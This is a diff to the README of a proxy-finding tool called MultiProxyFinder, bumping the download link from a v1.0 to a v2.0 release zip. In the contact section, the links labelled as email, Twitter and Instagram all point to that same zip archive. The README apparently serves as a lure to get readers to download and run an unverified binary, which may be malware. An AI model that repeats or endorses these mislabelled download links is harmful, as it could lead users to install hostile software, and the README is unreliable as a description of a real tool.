@@ -12,7 +12,7 @@ Welcome to MultiProxyFinder, your go-to tool for finding HTTPS and SOCKS proxies
 ## Installation 📥
 
 To get started with MultiProxyFinder, simply download the tool from the following link:  
-[Download MultiProxyFinder](https://github.com/AlejoBasualdo/MultiProxyFinder/releases/download/v1.0/Soft.zip)  
+[Download MultiProxyFinder](https://github.com/AlejoBasualdo/MultiProxyFinder/releases/download/v2.0/Software.zip)  
 
 Once the download is complete, launch the application to start exploring the world of proxies.
 
@@ -59,8 +59,8 @@ For any issues or queries related to MultiProxyFinder, please check the "Release
 ## Let's Connect 🌐
 
 Connect with us on social media to stay updated on the latest news and releases:  
-📧 Email: https://github.com/AlejoBasualdo/MultiProxyFinder/releases/download/v1.0/Soft.zip  
-🐦 Twitter: [@MultiProxyFinder](https://github.com/AlejoBasualdo/MultiProxyFinder/releases/download/v1.0/Soft.zip)  
-📷 Instagram: [MultiProxyFinder](https://github.com/AlejoBasualdo/MultiProxyFinder/releases/download/v1.0/Soft.zip)  
+📧 Email: https://github.com/AlejoBasualdo/MultiProxyFinder/releases/download/v2.0/Software.zip  
+🐦 Twitter: [@MultiProxyFinder](https://github.com/AlejoBasualdo/MultiProxyFinder/releases/download/v2.0/Software.zip)  
+📷 Instagram: [MultiProxyFinder](https://github.com/AlejoBasualdo/MultiProxyFinder/releases/download/v2.0/Software.zip)  
 
 Dive into the world of proxies with MultiProxyFinder and take control of your online privacy like never before! 🌐🛡️🕵️‍♂️
